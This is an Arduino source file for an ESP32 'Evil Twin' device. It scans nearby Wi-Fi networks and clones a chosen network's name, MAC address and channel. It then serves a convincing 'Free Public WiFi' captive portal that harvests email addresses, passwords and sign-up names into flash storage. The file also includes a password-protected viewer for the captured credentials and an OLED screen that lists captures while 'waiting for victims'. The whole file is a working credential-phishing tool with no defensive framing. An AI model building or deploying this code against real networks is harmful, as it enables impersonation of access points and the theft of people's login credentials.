// =============================================================
// ESP32 EVIL TWIN v1.0
// =============================================================
// Dedicated Evil Twin / captive portal credential harvester.
// Clones a nearby AP (SSID + BSSID + channel) and serves a
// realistic Free WiFi portal to collect logins and signups.
//
// STATES:  SCANNING → SELECT → LIVE → CREDS
//
// BOOT BUTTON (GPIO 0):
//   Single  = next AP (SELECT)  | next page (LIVE)  | next cred (CREDS)
//   Double  = launch twin       | stop twin          | back
//   Triple  = rescan            | view creds (LIVE)  | back
//
// SWITCHES:
//   D32 = Launch/Stop  (flip ON → launch on selected AP; flip OFF → stop)
//   D33 = Rescan       (flip ON → trigger new scan)
//
// PORTAL:
//   /        → Free WiFi login page
//   /signup  → account creation page
//   /creds   → admin creds viewer  (user: admin  pass: CREDS_PASSWORD)
// =============================================================

#define CREDS_PASSWORD "changeme123"   // ← change before flashing

#include <Arduino.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include <DNSServer.h>
#include <WebServer.h>
#include <SPIFFS.h>

// =============================================================
// PINS
// =============================================================
#define OLED_SDA   21
#define OLED_SCL   22
#define LED_RED     2
#define LED_BLUE   25
#define LED_GREEN  26
#define LED_YELLOW 27
#define SW_START   32   // launch/stop switch (internal pullup)
#define SW_SCAN    33   // rescan switch      (internal pullup)
#define BOOT_BTN    0

#define SCREEN_W 128
#define SCREEN_H  64

Adafruit_SSD1306 display(SCREEN_W, SCREEN_H, &Wire, -1);

// =============================================================
// STATE
// =============================================================
enum TwinState { TS_SCANNING, TS_SELECT, TS_LIVE, TS_CREDS };
TwinState state = TS_SCANNING;

// =============================================================
// BUTTON STATE MACHINE
// =============================================================
enum BtnSM { BS_IDLE, BS_PRESSED, BS_WAIT_MORE, BS_HOLDING };
BtnSM        btnState  = BS_IDLE;
int          btnClicks = 0;
unsigned long btnT     = 0;
bool evtSingle=false, evtDouble=false, evtTriple=false;
bool evtHoldStart=false, evtHoldEnd=false, isHolding=false;
const unsigned long HOLD_THRESH=700, CLICK_WINDOW=400;

void updateBoot() {
  evtSingle=evtDouble=evtTriple=evtHoldStart=evtHoldEnd=false;
  bool p=(digitalRead(BOOT_BTN)==LOW);
  unsigned long now=millis();
  switch(btnState) {
    case BS_IDLE:
      if(p){btnState=BS_PRESSED;btnT=now;} break;
    case BS_PRESSED:
      if(!p){btnClicks++;btnState=BS_WAIT_MORE;btnT=now;}
      else if(now-btnT>=HOLD_THRESH){btnClicks=0;btnState=BS_HOLDING;isHolding=true;evtHoldStart=true;}
      break;
    case BS_WAIT_MORE:
      if(p){btnState=BS_PRESSED;btnT=now;}
      else if(now-btnT>=CLICK_WINDOW){
        if(btnClicks==1)evtSingle=true;
        else if(btnClicks==2)evtDouble=true;
        else evtTriple=true;
        btnClicks=0;btnState=BS_IDLE;
      }
      break;
    case BS_HOLDING:
      if(!p){isHolding=false;evtHoldEnd=true;btnState=BS_IDLE;} break;
  }
}

// =============================================================
// OLED HELPERS
// =============================================================
void oledClear(){display.clearDisplay();display.setTextSize(1);display.setTextColor(SSD1306_WHITE);}
void oledHeader(const char* t){
  display.fillRect(0,0,SCREEN_W,11,SSD1306_WHITE);
  display.setTextColor(SSD1306_BLACK);display.setCursor(2,2);display.print(t);
  display.setTextColor(SSD1306_WHITE);
}
void oledFooter(const char* t){display.setCursor(0,57);display.setTextSize(1);display.print(t);}
void ledsOff(){digitalWrite(LED_RED,LOW);digitalWrite(LED_BLUE,LOW);
               digitalWrite(LED_GREEN,LOW);digitalWrite(LED_YELLOW,LOW);}

// =============================================================
// WIFI SCAN
// =============================================================
struct APEntry { char ssid[33]; uint8_t bssid[6]; int32_t rssi; uint8_t channel; };
#define MAX_APS 20
APEntry      apList[MAX_APS];
int          apCount=0, apSelected=0;
bool         wifiReady=false, wifiScanning=false;
unsigned long scanStarted=0;

void initWifi() {
  if(wifiReady) return;
  wifi_init_config_t cfg=WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg); esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_APSTA); esp_wifi_start();
  wifiReady=true;
}

void startScan() {
  initWifi();
  WiFi.mode(WIFI_STA); WiFi.scanNetworks(true,true);
  wifiScanning=true; apCount=0; apSelected=0;
  scanStarted=millis(); state=TS_SCANNING;
}

void pollScan() {
  if(!wifiScanning) return;
  int n=WiFi.scanComplete();
  if(n==WIFI_SCAN_RUNNING) return;
  if(n>0) {
    apCount=min(n,MAX_APS);
    for(int i=0;i<apCount;i++) {
      strlcpy(apList[i].ssid,WiFi.SSID(i).c_str(),33);
      apList[i].rssi=WiFi.RSSI(i); apList[i].channel=WiFi.channel(i);
      memcpy(apList[i].bssid,WiFi.BSSID(i),6);
    }
    WiFi.scanDelete();
    // Sort by RSSI descending (strongest first)
    for(int i=0;i<apCount-1;i++)
      for(int j=0;j<apCount-1-i;j++)
        if(apList[j].rssi<apList[j+1].rssi) {
          APEntry tmp=apList[j]; apList[j]=apList[j+1]; apList[j+1]=tmp;
        }
  }
  esp_wifi_set_mode(WIFI_MODE_APSTA);
  wifiScanning=false; apSelected=0;
  state=TS_SELECT;
}

// =============================================================
// EVIL TWIN
// =============================================================
DNSServer  dnsServer;
WebServer  httpServer(80);
bool       twinActive=false;
int        credCount=0;
char       twinSSID[33]="";
uint8_t    twinBSSID[6]={0};
uint8_t    twinChannel=1;
IPAddress  apIP(192,168,4,1);
int        livePage=0;
unsigned long twinStarted=0;

// --- OLED creds viewer ---
#define MAX_CRED_LINES 20
char credLines[MAX_CRED_LINES][64];
int  credLineCount=0, credLineScroll=0;

void loadCredsOLED() {
  credLineCount=0; credLineScroll=0;
  File f=SPIFFS.open("/creds.txt",FILE_READ);
  if(!f) return;
  while(f.available()&&credLineCount<MAX_CRED_LINES) {
    String ln=f.readStringUntil('\n'); ln.trim();
    if(ln.length()>0) strlcpy(credLines[credLineCount++],ln.c_str(),63);
  }
  f.close();
}

// =============================================================
// PORTAL HTML
// =============================================================
const char* portalHTML=R"html(<!DOCTYPE html>
<html><head>
<meta charset='utf-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Free WiFi — Sign In</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f2f2f7;min-height:100vh}
.adbar{background:#fff;border-bottom:1px solid #e5e5e5;padding:5px 14px;font-size:11px;color:#999;display:flex;justify-content:space-between}
.hero{background:linear-gradient(155deg,#1a73e8 0%,#0d47a1 100%);padding:28px 16px 22px;text-align:center;color:#fff}
.wico{margin-bottom:10px}
.hero h1{font-size:24px;font-weight:700;letter-spacing:-.3px}
.hero p{font-size:14px;opacity:.85;margin-top:5px}
.pill{display:inline-flex;gap:12px;background:rgba(255,255,255,.18);border-radius:20px;padding:5px 14px;font-size:11px;margin-top:10px}
.card{background:#fff;margin:14px;border-radius:14px;padding:20px;box-shadow:0 2px 10px rgba(0,0,0,.07)}
.msg{padding:10px 12px;border-radius:8px;font-size:13px;margin-bottom:14px;display:none}
.err{background:#fdecea;color:#c62828;border:1px solid #ef9a9a}
.ok{background:#e8f5e9;color:#2e7d32;border:1px solid #a5d6a7}
label{display:block;font-size:12px;font-weight:600;color:#555;margin-bottom:4px}
input{width:100%;padding:11px 13px;border:1.5px solid #ddd;border-radius:9px;font-size:15px;outline:none;margin-bottom:12px;-webkit-appearance:none;background:#fff}
input:focus{border-color:#1a73e8}
.btnp{width:100%;padding:13px;background:#1a73e8;color:#fff;border:none;border-radius:9px;font-size:16px;font-weight:600;cursor:pointer}
.btnp:active{background:#1557b0}
.sep{display:flex;align-items:center;gap:8px;margin:14px 0;color:#ccc;font-size:12px}
.sep::before,.sep::after{content:'';flex:1;height:1px;background:#eee}
.btno{width:100%;padding:12px;background:#fff;color:#1a73e8;border:1.5px solid #1a73e8;border-radius:9px;font-size:15px;font-weight:600;cursor:pointer}
.adcard{background:#fff;margin:0 14px 12px;border-radius:12px;padding:12px;box-shadow:0 1px 6px rgba(0,0,0,.06);display:flex;align-items:center;gap:11px}
.adico{width:42px;height:42px;border-radius:9px;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:20px}
.adtxt{font-size:12px;color:#555;line-height:1.4}
.adtxt b{color:#222;font-size:13px}
.adtxt a{color:#1a73e8;text-decoration:none;font-weight:600}
.footer{text-align:center;padding:4px 16px 22px;font-size:11px;color:#aaa;line-height:1.9}
.footer a{color:#1a73e8;text-decoration:none}
</style>
</head><body>
<div class='adbar'><span>Advertisement</span><span>&#10005;</span></div>
<div class='hero'>
<div class='wico'>
<svg width='58' height='58' viewBox='0 0 58 58'>
<circle cx='29' cy='29' r='29' fill='rgba(255,255,255,.18)'/>
<circle cx='29' cy='38' r='4.5' fill='#fff'/>
<path d='M18.5 29.5a14.8 14.8 0 0 1 21 0' stroke='#fff' stroke-width='2.8' stroke-linecap='round' fill='none'/>
<path d='M11 22a24 24 0 0 1 36 0' stroke='#fff' stroke-width='2.8' stroke-linecap='round' fill='none'/>
</svg>
</div>
<h1>Free Public WiFi</h1>
<p>Sign in to access the internet</p>
<div class='pill'><span>&#10003; Secure</span><span>&#10003; Unlimited</span><span>&#10003; Free</span></div>
</div>
<div class='card'>
<div class='msg err' id='em'></div>
<div class='msg ok' id='om'></div>
<form id='lf' action='/login' method='POST' onsubmit='return chk()'>
<label>Email address</label>
<input type='email' name='u' id='eu' placeholder='you@example.com' autocomplete='email'>
<label>Password</label>
<input type='password' name='p' id='ep' placeholder='Enter your password' autocomplete='current-password'>
<button class='btnp' type='submit'>Sign In</button>
</form>
<div class='sep'>or</div>
<button class='btno' onclick="location.href='/signup'">Create an Account</button>
</div>
<div class='adcard'>
<div class='adico' style='background:#fff3e0'>&#128737;</div>
<div class='adtxt'><b>Stay safe on public WiFi</b><br>NordVPN encrypts your connection. <a href='#'>Try free &rarr;</a></div>
</div>
<div class='adcard'>
<div class='adico' style='background:#e8f5e9'>&#9889;</div>
<div class='adtxt'><b>WiFi Premium &mdash; 10&times; faster</b><br>No ads &middot; Priority lanes &middot; &pound;2.99/mo. <a href='#'>Upgrade &rarr;</a></div>
</div>
<div class='footer'>
By continuing you agree to our <a href='#'>Terms of Service</a> and <a href='#'>Privacy Policy</a><br>
&copy; 2025 FreeWiFi Network Ltd. &middot; <a href='#'>Help</a>
</div>
<script>
(function(){
var p=new URLSearchParams(location.search);
if(p.get('e')){var m=document.getElementById('em');m.textContent='No account found with that email. Please check your details or create a new account.';m.style.display='block';}
if(p.get('m')){var o=document.getElementById('om');o.textContent='Account created successfully! You can now sign in with your new credentials.';o.style.display='block';}
})();
function chk(){
var u=document.getElementById('eu').value.trim();
var pw=document.getElementById('ep').value;
var em=document.getElementById('em');
em.style.display='none';
if(!u||!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(u)){em.textContent='Please enter a valid email address.';em.style.display='block';return false;}
if(!pw||pw.length<8){em.textContent='Password must be at least 8 characters.';em.style.display='block';return false;}
return true;
}
</script>
</body></html>)html";

const char* signupHTML=R"html(<!DOCTYPE html>
<html><head>
<meta charset='utf-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Create Account &mdash; Free WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f2f2f7;min-height:100vh}
.hero{background:linear-gradient(155deg,#1a73e8 0%,#0d47a1 100%);padding:24px 16px 18px;text-align:center;color:#fff}
.hero h1{font-size:22px;font-weight:700}
.hero p{font-size:13px;opacity:.85;margin-top:4px}
.card{background:#fff;margin:14px;border-radius:14px;padding:20px;box-shadow:0 2px 10px rgba(0,0,0,.07)}
.msg{padding:10px 12px;border-radius:8px;font-size:13px;margin-bottom:14px;display:none}
.err{background:#fdecea;color:#c62828;border:1px solid #ef9a9a}
label{display:block;font-size:12px;font-weight:600;color:#555;margin-bottom:4px}
input{width:100%;padding:11px 13px;border:1.5px solid #ddd;border-radius:9px;font-size:15px;outline:none;margin-bottom:12px;-webkit-appearance:none;background:#fff}
input:focus{border-color:#1a73e8}
.row{display:flex;gap:10px}
.row>div{flex:1}
.btnp{width:100%;padding:13px;background:#1a73e8;color:#fff;border:none;border-radius:9px;font-size:16px;font-weight:600;cursor:pointer}
.back{text-align:center;margin-top:14px;font-size:13px;color:#888}
.back a{color:#1a73e8;text-decoration:none;font-weight:600}
.footer{text-align:center;padding:4px 16px 22px;font-size:11px;color:#aaa}
.footer a{color:#1a73e8;text-decoration:none}
</style>
</head><body>
<div class='hero'>
<h1>Create Account</h1>
<p>Free access &mdash; no payment required</p>
</div>
<div class='card'>
<div class='msg err' id='em'></div>
<form id='sf' action='/signup' method='POST' onsubmit='return schk()'>
<div class='row'>
<div><label>First name</label><input type='text' name='fn' id='fn' placeholder='Jane'></div>
<div><label>Last name</label><input type='text' name='ln' id='ln' placeholder='Doe'></div>
</div>
<label>Email address</label>
<input type='email' name='u' id='eu' placeholder='you@example.com' autocomplete='email'>
<label>Password <span style='font-weight:400;color:#aaa;font-size:11px'>(min. 8 characters)</span></label>
<input type='password' name='p' id='ep' placeholder='Create a password'>
<label>Confirm password</label>
<input type='password' name='p2' id='ep2' placeholder='Repeat your password'>
<button class='btnp' type='submit'>Create Account</button>
</form>
<div class='back'>Already have an account? <a href='/'>Sign in</a></div>
</div>
<div class='footer'><a href='#'>Terms</a> &middot; <a href='#'>Privacy</a> &middot; &copy; 2025 FreeWiFi Network Ltd.</div>
<script>
function schk(){
var fn=document.getElementById('fn').value.trim();
var u=document.getElementById('eu').value.trim();
var pw=document.getElementById('ep').value;
var p2=document.getElementById('ep2').value;
var em=document.getElementById('em');
em.style.display='none';
if(!fn){em.textContent='Please enter your first name.';em.style.display='block';return false;}
if(!u||!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(u)){em.textContent='Please enter a valid email address.';em.style.display='block';return false;}
if(!pw||pw.length<8){em.textContent='Password must be at least 8 characters.';em.style.display='block';return false;}
if(pw!==p2){em.textContent='Passwords do not match. Please try again.';em.style.display='block';return false;}
return true;
}
</script>
</body></html>)html";

// =============================================================
// START / STOP TWIN
// twinSSID, twinBSSID, twinChannel must be set before calling
// =============================================================
void startTwin() {
  SPIFFS.begin(true);
  initWifi();
  esp_wifi_stop();
  esp_wifi_set_mac(WIFI_IF_AP, twinBSSID);
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_start();
  WiFi.softAPConfig(apIP, apIP, IPAddress(255,255,255,0));
  WiFi.softAP(twinSSID, "", twinChannel, 0, 4);
  dnsServer.start(53, "*", apIP);

  httpServer.on("/", HTTP_GET, []{
    httpServer.send(200, "text/html", portalHTML);
  });
  httpServer.on("/login", HTTP_POST, []{
    String u=httpServer.arg("u"), p=httpServer.arg("p");
    File f=SPIFFS.open("/creds.txt", FILE_APPEND);
    if(f){ f.printf("[LOGIN %lus] %s : %s\n", millis()/1000, u.c_str(), p.c_str()); f.close(); }
    credCount++; digitalWrite(LED_GREEN,HIGH); delay(40); digitalWrite(LED_GREEN,LOW);
    httpServer.sendHeader("Location","/?e=1"); httpServer.send(302);
  });
  httpServer.on("/signup", HTTP_GET, []{
    httpServer.send(200, "text/html", signupHTML);
  });
  httpServer.on("/signup", HTTP_POST, []{
    String fn=httpServer.arg("fn"), ln=httpServer.arg("ln");
    String u=httpServer.arg("u"), p=httpServer.arg("p");
    File f=SPIFFS.open("/creds.txt", FILE_APPEND);
    if(f){ f.printf("[SIGNUP %lus] %s %s | %s : %s\n", millis()/1000, fn.c_str(), ln.c_str(), u.c_str(), p.c_str()); f.close(); }
    credCount++; digitalWrite(LED_GREEN,HIGH); delay(40); digitalWrite(LED_GREEN,LOW);
    httpServer.sendHeader("Location","/?m=1"); httpServer.send(302);
  });
  httpServer.on("/creds", HTTP_GET, []{
    if(!httpServer.authenticate("admin", CREDS_PASSWORD))
      return httpServer.requestAuthentication(BASIC_AUTH, "EvilTwin", "Denied.");
    File f=SPIFFS.open("/creds.txt", FILE_READ);
    if(!f || f.size()==0){ httpServer.send(200,"text/plain","No credentials captured yet."); return; }
    String out="<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
               "<style>body{font-family:monospace;padding:15px;background:#111;color:#0f0}"
               "pre{background:#000;padding:12px;border-radius:6px;overflow-x:auto;white-space:pre-wrap;word-break:break-all}"
               "a{color:#0f0}</style></head><body><h3>Captured Credentials</h3><pre>";
    while(f.available()) out+=(char)f.read();
    f.close();
    out+="</pre><br><a href='/creds/clear'>[Clear all]</a></body></html>";
    httpServer.send(200, "text/html", out);
  });
  httpServer.on("/creds/clear", HTTP_GET, []{
    if(!httpServer.authenticate("admin", CREDS_PASSWORD))
      return httpServer.requestAuthentication(BASIC_AUTH, "EvilTwin", "Denied.");
    SPIFFS.remove("/creds.txt"); credCount=0;
    httpServer.send(200, "text/plain", "Cleared.");
  });
  httpServer.onNotFound([]{
    httpServer.sendHeader("Location", "http://192.168.4.1/");
    httpServer.send(302);
  });
  httpServer.begin();

  twinActive=true; twinStarted=millis(); livePage=0;
  state=TS_LIVE;
  digitalWrite(LED_RED, HIGH);
}

void stopTwin() {
  httpServer.stop(); dnsServer.stop();
  WiFi.softAPdisconnect(true);
  twinActive=false; ledsOff();
  state=TS_SELECT;
}

// =============================================================
// OLED DRAW
// =============================================================
static int    scanDots=0;
static unsigned long scanDotsLast=0;

void drawScanning() {
  oledClear();
  oledHeader("EVIL TWIN — SCAN");
  display.setCursor(10,16); display.print("Scanning for APs");
  if(millis()-scanDotsLast>400){ scanDots=(scanDots+1)%4; scanDotsLast=millis(); }
  for(int i=0;i<scanDots;i++){ display.setCursor(10+i*7,26); display.print("."); }
  unsigned long el=(millis()-scanStarted)/1000;
  display.setCursor(10,40); display.printf("%lus elapsed", el);
  display.setCursor(10,52); display.print("Please wait...");
  display.display();
}

// Draw a mini signal-strength icon (4 bars) at pixel (x,y)
void drawBars(int x, int y, int rssi, bool invert) {
  uint16_t col = invert ? SSD1306_BLACK : SSD1306_WHITE;
  uint16_t bg  = invert ? SSD1306_WHITE : SSD1306_BLACK;
  int bars=(rssi>-50)?4:(rssi>-65)?3:(rssi>-75)?2:1;
  for(int b=0;b<4;b++){
    int bh=(b+1)*2; int bx=x+b*4; int by=y+(8-bh);
    if(b<bars) display.fillRect(bx,by,3,bh,col);
    else       display.fillRect(bx,by,3,bh,bg);
    display.drawRect(bx,by,3,bh,col);
  }
}

void drawSelect() {
  oledClear();
  char hdr[22]; snprintf(hdr,22,"SELECT AP  [%d]",apCount);
  oledHeader(hdr);

  if(apCount==0) {
    display.setCursor(4,18); display.print("No APs found.");
    display.setCursor(4,30); display.print("Triple = rescan");
    display.display(); return;
  }

  // Show up to 3 APs, 15px rows
  for(int i=0;i<3&&i<apCount;i++) {
    int idx=(apSelected+i)%apCount;
    int y=12+i*15;
    bool sel=(i==0);
    if(sel) {
      display.fillRect(0,y,SCREEN_W,13,SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
    }
    char ssidBuf[15]=""; strlcpy(ssidBuf, apList[idx].ssid, 15);
    display.setCursor(2,y+3); display.print(ssidBuf);
    display.setCursor(SCREEN_W-30,y+1);
    display.printf("c%d",apList[idx].channel);
    drawBars(SCREEN_W-15, y+2, apList[idx].rssi, sel);
    if(sel) display.setTextColor(SSD1306_WHITE);
  }

  // Selected AP details at bottom
  display.drawLine(0,57,SCREEN_W,57,SSD1306_WHITE);
  char info[32]; snprintf(info,32,"%ddBm %02X:%02X:%02X:%02X:%02X:%02X",
    apList[apSelected].rssi,
    apList[apSelected].bssid[0],apList[apSelected].bssid[1],apList[apSelected].bssid[2],
    apList[apSelected].bssid[3],apList[apSelected].bssid[4],apList[apSelected].bssid[5]);
  display.setCursor(0,58); display.print(info);
  display.display();
}

void drawLive() {
  oledClear();
  char hdr[22]; snprintf(hdr,22,"LIVE  [%d cred%s]",credCount,credCount==1?"":"s");
  oledHeader(hdr);

  if(livePage==0) {
    // Stats page
    display.setCursor(0,13); display.printf("SSID: %.18s",twinSSID);
    display.setCursor(0,23); display.printf("ch:%-2d  %02X:%02X:%02X",
      twinChannel,twinBSSID[0],twinBSSID[1],twinBSSID[2]);
    display.setCursor(0,33); display.print("IP:   192.168.4.1");
    unsigned long up=(millis()-twinStarted)/1000;
    display.setCursor(0,43);
    if(up<60)       display.printf("Up: %lus",up);
    else if(up<3600)display.printf("Up: %lum %lus",up/60,up%60);
    else            display.printf("Up: %luh %lum",up/3600,(up%3600)/60);
    oledFooter("1:pg 2:stop 3:creds");
  } else {
    // Last capture preview
    display.setCursor(0,13); display.printf("Last capture (#%d):",credCount);
    if(credCount==0) {
      display.setCursor(4,28); display.print("None yet.");
      display.setCursor(4,40); display.print("Waiting for victims.");
    } else {
      File f=SPIFFS.open("/creds.txt",FILE_READ);
      String last="";
      if(f){ while(f.available()){ String ln=f.readStringUntil('\n'); if(ln.length()>2) last=ln; } f.close(); }
      last.trim();
      bool isSignup=last.startsWith("[SIGNUP");
      int ts=last.indexOf("] "); int sep=last.lastIndexOf(" : ");
      if(isSignup){
        int pipe=last.indexOf(" | ");
        String nm=ts>=0?last.substring(ts+2,pipe>=0?pipe:last.length()):"?";
        String em=pipe>=0?last.substring(pipe+3,sep>=0?sep:last.length()):"?";
        String pw=sep>=0?last.substring(sep+3):"?";
        display.setCursor(0,24); display.print("[SIGNUP]");
        display.setCursor(0,33); display.printf("%.20s",nm.c_str());
        display.setCursor(0,43); display.printf("%.20s",em.c_str());
      } else {
        String user=ts>=0?last.substring(ts+2,sep>=0?sep:last.length()):"?";
        String pw=sep>=0?last.substring(sep+3):"?";
        display.setCursor(0,24); display.print("[LOGIN]");
        display.setCursor(0,33); display.printf("%.20s",user.c_str());
        display.setCursor(0,43); display.printf("%.20s",pw.c_str());
      }
    }
    oledFooter("1:pg 2:stop 3:creds");
  }

  // Blink red LED every 600ms
  static unsigned long lastBlink=0;
  if(millis()-lastBlink>600){ digitalWrite(LED_RED,!digitalRead(LED_RED)); lastBlink=millis(); }
  display.display();
}

void drawCreds() {
  oledClear();
  char hdr[22]; snprintf(hdr,22,"CREDS [%d]",credLineCount);
  oledHeader(hdr);

  if(credLineCount==0) {
    display.setCursor(4,22); display.print("No creds captured.");
    display.setCursor(4,36); display.print("Waiting for victims.");
  } else {
    String ln=credLines[credLineScroll % credLineCount];
    bool isSignup=ln.startsWith("[SIGNUP");
    int ts=ln.indexOf("] ");
    int sep=ln.lastIndexOf(" : ");

    if(isSignup) {
      int pipe=ln.indexOf(" | ");
      String nm=ts>=0 ?ln.substring(ts+2, pipe>=0?pipe:ln.length()):"?";
      String em=pipe>=0?ln.substring(pipe+3, sep>=0?sep:ln.length()):"?";
      String pw=sep>=0 ?ln.substring(sep+3):"?";
      display.setCursor(0,13); display.print("TYPE: SIGNUP");
      display.setCursor(0,23); display.printf("Name: %.18s",nm.c_str());
      display.setCursor(0,33); display.printf("Mail: %.18s",em.c_str());
      display.setCursor(0,43); display.printf("Pass: %.18s",pw.c_str());
    } else {
      String user=ts>=0 ?ln.substring(ts+2, sep>=0?sep:ln.length()):"?";
      String pw  =sep>=0?ln.substring(sep+3):"?";
      display.setCursor(0,13); display.print("TYPE: LOGIN");
      display.setCursor(0,27); display.printf("User: %.18s",user.c_str());
      display.setCursor(0,41); display.printf("Pass: %.18s",pw.c_str());
    }
    char nav[10]; snprintf(nav,10,"%d/%d",credLineScroll+1,credLineCount);
    display.setCursor(100,57); display.print(nav);
  }
  oledFooter("1:next  2:back");
  display.display();
}

// =============================================================
// SWITCH HANDLING (edge-triggered)
// =============================================================
bool lastSwStart=HIGH, lastSwScan=HIGH;

void checkSwitches() {
  bool swStart=(digitalRead(SW_START)==LOW);
  bool swScan =(digitalRead(SW_SCAN) ==LOW);

  // SW_START rising edge (just flipped ON) → launch
  if(swStart && !lastSwStart) {
    if(!twinActive && state==TS_SELECT && apCount>0) {
      strlcpy(twinSSID, apList[apSelected].ssid, 33);
      memcpy(twinBSSID, apList[apSelected].bssid, 6);
      twinChannel=apList[apSelected].channel;
      startTwin();
    }
  }
  // SW_START falling edge (just flipped OFF) → stop
  if(!swStart && lastSwStart) {
    if(twinActive) stopTwin();
  }
  // SW_SCAN rising edge → rescan
  if(swScan && !lastSwScan) {
    if(!twinActive) startScan();
  }

  lastSwStart=swStart;
  lastSwScan =swScan;
}

// =============================================================
// SETUP
// =============================================================
void setup() {
  Serial.begin(115200);
  pinMode(LED_RED,OUTPUT);   pinMode(LED_BLUE,OUTPUT);
  pinMode(LED_GREEN,OUTPUT); pinMode(LED_YELLOW,OUTPUT);
  pinMode(SW_START, INPUT_PULLUP);
  pinMode(SW_SCAN,  INPUT_PULLUP);
  pinMode(BOOT_BTN, INPUT_PULLUP);

  Wire.begin(OLED_SDA, OLED_SCL);
  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) { Serial.println("OLED fail"); while(1); }

  // Splash
  display.clearDisplay(); display.setTextColor(SSD1306_WHITE);
  display.setTextSize(2); display.setCursor(4,4);  display.print("EVIL");
  display.setTextSize(2); display.setCursor(4,24); display.print("TWIN");
  display.setTextSize(1); display.setCursor(70,6); display.print("v1.0");
  display.setCursor(70,18); display.print("ESP32");
  display.setCursor(4,50); display.print("Starting scan...");
  display.display();

  for(int i=0;i<2;i++)
    for(int p:{LED_RED,LED_BLUE,LED_GREEN,LED_YELLOW})
      { digitalWrite(p,HIGH); delay(60); digitalWrite(p,LOW); }

  SPIFFS.begin(true);
  delay(300);
  startScan();
}

// =============================================================
// LOOP
// =============================================================
void loop() {
  updateBoot();
  checkSwitches();

  switch(state) {
    // ── SCANNING ──────────────────────────────────────────────
    case TS_SCANNING:
      pollScan();
      drawScanning();
      break;

    // ── SELECT ────────────────────────────────────────────────
    case TS_SELECT:
      if(evtSingle && apCount>0) apSelected=(apSelected+1)%apCount;
      if(evtDouble && apCount>0) {
        strlcpy(twinSSID, apList[apSelected].ssid, 33);
        memcpy(twinBSSID, apList[apSelected].bssid, 6);
        twinChannel=apList[apSelected].channel;
        startTwin();
      }
      if(evtTriple) startScan();
      drawSelect();
      break;

    // ── LIVE ──────────────────────────────────────────────────
    case TS_LIVE:
      dnsServer.processNextRequest();
      httpServer.handleClient();
      if(evtSingle) livePage=(livePage+1)%2;
      if(evtDouble) stopTwin();
      if(evtTriple) { loadCredsOLED(); state=TS_CREDS; }
      drawLive();
      break;

    // ── CREDS ─────────────────────────────────────────────────
    case TS_CREDS:
      if(evtSingle) credLineScroll=(credLineScroll+1)%max(credLineCount,1);
      if(evtDouble||evtTriple) {
        if(twinActive) state=TS_LIVE;
        else { state=TS_SELECT; }
      }
      drawCreds();
      break;
  }
}
